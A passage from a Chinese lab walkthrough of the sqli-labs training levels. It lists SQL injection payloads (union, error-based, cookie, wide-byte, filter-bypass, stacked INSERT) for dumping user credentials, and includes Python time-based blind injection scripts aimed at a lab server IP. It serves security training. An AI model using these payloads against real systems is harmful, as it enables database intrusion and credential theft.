alt="image-20220716160005979"></p><p><strong>爆账号密码</strong>：’ or updatexml(1,concat(0x7e,(select group_concat(concat_ws(‘~’,username,password)) from users),0x7e),1),’’,’’) #</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207161602875.png" alt="image-20220716160248828"></p><h4 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h4><p>访问并输入正确账号和密码的页面</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221619554.png" alt="image-20220722161919472"></p><p>这题同样是用报错注入过，通过测试闭合符发现只有单引号会报错，所以闭合符为单引号</p><p>注入点在Referer上</p><p><strong>payload：</strong>‘ or updatexml(1,concat(0x7e,database(),0x7e),1),’’,’’) #</p><h4 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h4><p>访问页面</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221626381.png" alt="image-20220722162641317"></p><p>输入正确的账号和密码后是这样的</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221627093.png" alt="image-20220722162710032"></p><p>登录成功并且记录了cookie</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221628397.png" alt="image-20220722162847338"></p><p>发现修改cookie的值就能实现任意账号登录</p><p>我们可以把cookie当作一个输入账号的地址。cookie很明显会与数据库进行交互我们找闭合符就好了.</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221632122.png" alt="image-20220722163215067"></p><p>使用admin\成功发现闭合符号为’</p><p><strong>字段数</strong>：admin1’ order by 3 #</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221633507.png" alt="image-20220722163306456"></p><p><strong>爆数据库名：</strong>-1’ union select database(),2,3#</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221634429.png" alt="image-20220722163432369"></p><p><strong>数据库版本：</strong>-1’ union select version(),2,3 #</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221635924.png" alt="image-20220722163536870"></p><p><strong>表名</strong>：-1’ union select (select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()),2,3 #</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221638518.png" alt="image-20220722163825462"></p><p><strong>字段名：</strong>-1’ union select (select group_concat(column_name) from information_schema.columns where table_schema &#x3D; database() and table_name &#x3D; ‘users’),2,3 #</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221640489.png" alt="image-20220722164007431"></p><p><strong>账号密码：</strong>uname&#x3D;-1’ union select group_concat(username),group_concat(password),2 from users#</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221644313.png" alt="image-20220722164440259"></p><h4 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h4><p>访问页面</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221645678.png" alt="image-20220722164521615"></p><p>输入正确的账号和密码后发现还是cookie注入</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221646563.png" alt="image-20220722164604500"></p><p>burp看数据包</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221646086.png" alt="image-20220722164653032"></p><p>发现cookie进行了加密，一开始看见百分号以为是url编码，后面又试了一下是base64</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221649996.png" alt="image-20220722164909952"></p><p>将admin\进行base64编码再替换cookie值</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221658690.png" alt="image-20220722165804641"></p><p>发现闭合符为’)</p><p>接下来构造payload即可</p><p><strong>数据库：</strong> -1’)  union select 1,2,database()  #</p><p>**base64:**LTEnKSAgdW5pb24gc2VsZWN0IDEsMixkYXRhYmFzZSgpICAj</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221659378.png" alt="image-20220722165929318"></p><p>后面的也同样是替换base64</p><p><strong>Less-22</strong></p><p>访问页面输入账号和密码后，发现页面提示了cookie</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221704580.png" alt="image-20220722170453522"></p><p>直接用浏览器登录刷新后获取到了cookie</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221706149.png" alt="image-20220722170621102"></p><p>cookie处还是用了base64进行加密</p><p>还是用admin\转换程base64判断闭合符</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221708132.png" alt="image-20220722170853082"></p><p>如上图，闭合符为”,接下来继续构造payload</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221710977.png" alt="image-20220722171038924"></p><p><strong>数据库;</strong>-1” union select database(),2,3 #</p><p>**base64:**LTEiIHVuaW9uIHNlbGVjdCBkYXRhYmFzZSgpLDIsMyAj</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221711150.png" alt="image-20220722171117101"></p><p>后面的也是base64替换即可，就不做了。</p><h2 id="项目二-Stacked-Injections"><a href="#项目二-Stacked-Injections" class="headerlink" title="项目二(Stacked Injections)"></a>项目二(Stacked Injections)</h2><h4 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h4><p>访问页面后提示输入id值进行传参</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221713320.png" alt="image-20220722171340258"></p><p>输入参数后直接就显示了账号和密码</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221715008.png" alt="image-20220722171507951"></p><p>输入\判断闭合符</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207221717467.png" alt="image-20220722171729425"></p><p>如上图，闭合符为’</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207261447581.png" alt="image-20220726144729469"></p><p>但还是报错了，看了源码发现注释符被过滤了，所以我们应该把后面的也进行一个闭合</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207261452972.png" alt="image-20220726145225916"></p><p>成功回显</p><p><strong>爆数据库</strong>：-1’ union select 1,2,database() ‘</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207261458711.png" alt="image-20220726145839649"></p><p><strong>爆数据库版本：</strong>id&#x3D;-1’ union select 1,2,version() ‘</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207261515903.png" alt="image-20220726151550813"></p><p>后面的就不一一列举了</p><h4 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h4><p>访问页面</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207261516939.png" alt="image-20220726151624886"></p><p>是一个登录页面，我们输入一个正确的账号密码试试水</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207261517369.png" alt="image-20220726151725311"></p><p>登进去了，我们也可以修改密码</p><p>也可以注册新用户，但忘记密码这个功能用不了</p><p>看了半天，一以为是新用户注册那注册用户然后进行登录比如adm’ order by 3 #这样的用户在登录时会出现回显那种。</p><p>看了网上wp后，明白了原来是二次注入的方式修改admin的密码</p><h4 id="Less-25a："><a href="#Less-25a：" class="headerlink" title="Less-25a："></a><strong>Less-25a</strong>：</h4><p>准备查看26关源码时以为的发现居然有25a的源码，还好发现了不然这关没了</p><p>访问页面：</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207261546235.png" alt="image-20220726154637167"></p><p>页面提示了会过滤掉一些关键字，下面也会输出没过滤掉的内容</p><p><strong>爆字段数：</strong>id&#x3D;1 oorrder by 3 –+</p><p>用oorr双写过滤掉了or</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207261608720.png" alt="image-20220726160834648"></p><p><strong>爆数据库</strong>：-1 union select 1,2,database() –+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207261612459.png" alt="image-20220726161214382"></p><p><strong>表名：</strong>id&#x3D;-1 union select 1,2,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema&#x3D;database()) –+</p><p>这表爆半天，命令啥的都没问题可就是不出表名，结果看别人wp发现information这个语句过滤掉了or。T_T，居然没发现</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207261654252.png" alt="image-20220726165405154"></p><p><strong>爆字段：</strong>id&#x3D;-1 union select 1,2,(select group_concat(column_name) from infoorrmation_schema.columns where table_name&#x3D;’users’  aandnd table_schema&#x3D;database()) –+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207261712876.png" alt="image-20220726171229836"></p><p>爆账号和密码：id&#x3D;-1 union select 1,(select group_concat(username) from users),(select group_concat(passwoorrd) from users)</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207261725521.png" alt="image-20220726172501461"></p><h4 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h4><p>这关主要是过滤了空格，看了网上的wp很多多是用报错注入实现的，但很久没用python来写exp了，所以我们这边使用盲注来写exp</p><p><strong>爆数据库：</strong>   </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload, args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        t2 = threading.Thread(target=controller, args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">15</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">91</span>, <span class="number">127</span>):</span><br><span class="line">                a = <span class="string">&#x27;&quot;)&#x27;</span></span><br><span class="line">                payload = <span class="string">f&quot;-1&#x27;XOorR(if(ascii(substr(database(),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,sleep(3),0)) oorr&#x27;&quot;</span></span><br><span class="line">                dic = &#123;<span class="string">&quot;search&quot;</span>: <span class="built_in">chr</span>(j), <span class="string">&quot;payload&quot;</span>: payload&#125;</span><br><span class="line">                q.put(dic)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">controller</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> q.empty():</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">dic</span>):</span><br><span class="line">    <span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">    url = <span class="string">&quot;http://101.35.96.6:8000/Less-26/?id=&quot;</span> + dic[<span class="string">&quot;payload&quot;</span>]</span><br><span class="line">    cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;rlvk21bo492d5t2amm9p7i2o65&quot;</span>&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6,zh-HK;q=0.5&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    t_time1 = time.time()</span><br><span class="line">    requests.get(url=url, headers=headers, data=dic[<span class="string">&quot;payload&quot;</span>],cookies=cookies)</span><br><span class="line">    t_time2 = time.time()</span><br><span class="line">    <span class="keyword">if</span> t_time2 - t_time1 &gt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(dic[<span class="string">&quot;search&quot;</span>],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment"># print(url)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207271837526.png" alt="image-20220727183720410">                                </p><p>后面的就不列举了，照着套就行</p><h4 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h4><p>用25关exp改个url就行了</p><h4 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h4><p>这题和前面题都差不多，而且这题就过滤了空格，and和or都没过滤掉，盲注和报错注入都可以用，我们这边使用报错注入简单一点。</p><p><strong>爆数据库名</strong>：1’and((updatexml(1,concat(0x7e,(select database()),0x7e),1)))or’<img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207291522609.png" alt="image-20220729152211482"></p><p><strong>爆数据库版本</strong>：1’and((updatexml(1,concat(0x7e,(select version()),0x7e),1)))or’</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207291522071.png" alt="image-20220729152247977"></p><p><strong>爆表名</strong>:1’and((updatexml(1,concat(0x7e,(selEct%a0 group_concat(table_name)%a0from%a0  information_schema.tables%a0where%a0table_schema &#x3D; database()),0x7e),1)))or’</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207291610036.png" alt="image-20220729161019956"></p><p>后面的照着套就行</p><h4 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h4><p>这题把报错给屏蔽了</p><p>可以用盲注来做，或者回显明注</p><p>这里我们使用回显明注</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207291735128.png" alt="image-20220729173524049"></p><p>过滤了union和select不过双写或者大小写就能绕过</p><p>再用%a0替换空格即可</p><h4 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h4><p>这题主要过滤了union select</p><p>一开始以为是’闭合试了半天都找不到出错原因，我主要是对and构造真假了辨别</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207291758227.png" alt="image-20220729175830132"></p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207291758810.png" alt="image-20220729175849726"></p><p>用回显注，结果怎么试都不对，</p><p>看了源码才知道是闭合符是‘)，但匪夷所思的是可以用’来做盲注是行的通的，原理暂时不知道。。</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207291855520.png" alt="image-20220729185512434"></p><p><strong>爆数据库：</strong>?id&#x3D;k’)%0aunion%a0selEct%0a1,database(),3%0aor(‘</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207291857645.png" alt="image-20220729185746552"></p><h4 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h4><p>这题和28关一样</p><p><strong>爆数据库</strong>：id&#x3D;k’) union%a0select 1,database(),1  or (‘</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207311321659.png" alt="image-20220731132126502"></p><h4 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h4><p>这题用\知道了闭合符为’</p><p>主要是把下方的回显都弄成url编码了，不过问题不大</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207311327655.png" alt="image-20220731132729583"></p><p><strong>爆当前数据库</strong>：id&#x3D;k’ union select 1,2,database() –+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207311328242.png" alt="image-20220731132853164"></p><p><strong>爆所有数据库：</strong>k’ union select 1,2,(select group_concat(schema_name) from information_schema.schemata)–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207311331544.png" alt="image-20220731133110462"></p><p><strong>爆表名：</strong><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207311332986.png" alt="image-20220731133218920"></p><p><strong>爆字段名</strong>：k’ union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’)–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207311333607.png" alt="image-20220731133329540"></p><p><strong>爆账号密码：</strong>id&#x3D;<br>k’ union select 1,2,group_concat(concat_ws(‘~’,username,password)) from security.users–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207311341184.png" alt="image-20220731134137101"></p><h4 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h4><p>这题和29题一样改个闭合符就行了</p><p>注释符为”</p><h4 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h4><p>老样子使用\判断注释符</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207311412701.png" alt="image-20220731141226647"></p><p>闭合符为”)</p><p>这题也和29题一样，改个闭合符就行</p><h4 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h4><p>这题主要是对特殊字符进行了转义,不过可以进行宽字节注入</p><p>使用%df%27即可逃逸gpc</p><p>通过%df%27对转义字符进行二次转义得到  X‘进行闭合</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207311658528.png" alt="image-20220731165854445"></p><p><strong>字段数</strong>：1%df%27 order by 3–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207311700628.png" alt="image-20220731170017559"></p><p><strong>爆数据库</strong>：%df%27 union select 1,2,group_concat(schema_name) from information_schema.schemata–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207311702176.png" alt="image-20220731170206121"></p><p><strong>爆表名：</strong>%df%27 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207311703150.png" alt="image-20220731170324085"></p><p><strong>爆字段名：</strong>%df%27 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name &#x3D; 0x7573657273–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207311709941.png" alt="image-20220731170913880"></p><p><strong>爆账号和密码</strong>：%df%27 union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users–+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207311711157.png" alt="image-20220731171133089"></p><h4 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h4><p>这关和上一关一样</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208021053920.png" alt="image-20220802105301812"></p><p>就不再演示了</p><h4 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h4><p>这关又来到了post注入</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208021053780.png" alt="image-20220802105350712"></p><p>这一关用不了url过滤，不过直接用%aa转义后的字符直接添加进去也可以爆出数据</p><p><strong>爆数据库：</strong>uname&#x3D;�’ union select 1,group_concat(schema_name) from information_schema.schemata–+&amp;passwd&#x3D;1</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208021208055.png" alt="image-20220802120851991"></p><p><strong>爆表名</strong>：uname&#x3D;�’ union select 1,group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()–+&amp;passwd&#x3D;1</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208021210766.png" alt="image-20220802121011702"></p><p>剩下的就不一一演示了，直接套就行</p><h4 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h4><p>这题我弄了半天闭合符，看了源码才知道没闭合，而且这字符串转义，被这题虚晃一枪了</p><p>直接用最简单的sql注入就行</p><p><strong>爆数据库</strong>：-1 union select 1,database(),3 –+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208021329648.png" alt="image-20220802132952581"></p><h4 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h4><p>这题同样是宽字节注入，闭合符为’</p><p><strong>爆数据库：</strong>%df%27 union select 1,group_concat(schema_name),3 from information_schema.schemata –+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208021335685.png" alt="image-20220802133553617"></p><h4 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h4><p>这题和上一题一一样，只是把get注入换成了post注入</p><p><strong>爆表名</strong>：uname&#x3D;admin�’ union select 1,group_concat(schema_name) from information_schema.schemata #&amp;passwd&#x3D;admin</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208021338965.png" alt="image-20220802133842886"></p><h2 id="项目三-Stacked-Injections"><a href="#项目三-Stacked-Injections" class="headerlink" title="项目三(Stacked Injections)"></a>项目三(Stacked Injections)</h2><h4 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h4><p>这题用\找出闭合符为’后，直接构造payload就行</p><p><strong>爆数据库</strong>：-1’ union select 1,group_concat(schema_name),3 from information_schema.schemata –+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208021342583.png" alt="image-20220802134222519"></p><p>当然这关是堆叠注入的主要考堆叠注入，所以我们还是使用堆叠来做</p><p>这题判断出闭合符后再插入数据即可</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208031527459.png" alt="image-20220803152711326"></p><p>访问看看</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208031527308.png" alt="image-20220803152758245"></p><h4 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h4><p>这题和38题一样，不过没闭合符</p><p><strong>爆数据库</strong>：-1 union select 1,2,group_concat(schema_name) from information_schema.schemata  –+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208021344131.png" alt="image-20220802134458060"></p><h4 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h4><p>这题没报错信息，手工判断的闭合符为‘）</p><p>除闭合符外，其他的也和38题一样</p><p><strong>爆数据库：</strong>-1’) union select 1,2,group_concat(schema_name) from information_schema.schemata  –+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208021353925.png" alt="image-20220802135330855"></p><h4 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h4><p>这题和38题一模一样只是没了报错信息</p><p><strong>爆表名</strong>：-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema &#x3D; database() –+</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208021356790.png" alt="image-20220802135639721"></p><h4 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h4><p>这题同样是堆叠注入，但从get改成了post方式</p><p>这题我用户名试了半天闭合符，看了源码发现突破点在密码。。。</p><p>试出闭合符后再插入数据即可</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208031553115.png" alt="image-20220803155357052"></p><p>成功注入</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208031553890.png" alt="image-20220803155322816"></p><h4 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h4><p>这题和42题一样，只是改了注释符，注释符为‘）</p><p>admin’);insert into users values(40,’less44’,’less44’)#</p><h4 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h4><p>admin’;insert into users values(40,’less44’,’less44’)#</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208031604495.png" alt="image-20220803160457433"></p><h4 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h4><p>admin’);insert into users values(45,’Less45’,’Less45’)#</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208031608271.png" alt="image-20220803160802189"></p><h4 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h4><p>这题改变了以前的传输名，返回的也是表格，所以我们不能利用数据回显的位置，但可以使用盲注和报错注入</p><p><strong>表名</strong>：1 AND updatexml(1,concat(“<del>“,database(),”</del>“),2)#</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208031622237.png" alt="image-20220803162218188"></p><h4 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h4><p>这一关闭合符为’，其他的和46关一致</p><h4 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h4><p>这一关不管输什么闭合符都无回显，所以初步判定为数值盲注</p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url=&quot;http://101.35.96.6:8000/Less-48/?sort=&quot;</span><br><span class="line"></span><br><span class="line">database=&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">for i in range(1,9):</span><br><span class="line">    min = 32</span><br><span class="line">    max = 127</span><br><span class="line">    while min&lt;max:</span><br><span class="line">        mid=(min+max)//2</span><br><span class="line">        payload=f&quot;1 and if(ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(3),1)--+&quot;</span><br><span class="line">        time_1 = time.time()</span><br><span class="line">        response=requests.get(url=url+payload)</span><br><span class="line">        time_2 = time.time()</span><br><span class="line">        if time_2 - time_1 &gt; 3:</span><br><span class="line">            min =mid+1</span><br><span class="line">        else:</span><br><span class="line">            max=mid</span><br><span class="line">    if min !=32 :</span><br><span class="line">        database+=chr(min)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(database)</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202208041719972.png" alt="image-20220804171952852"></p><h4 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h4><p>这题输’无回显，但输其他的都能正常回显，所以初步判定’为闭合符</p><p>这题我们同样使用盲注</p><p><strong>爆数据库</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 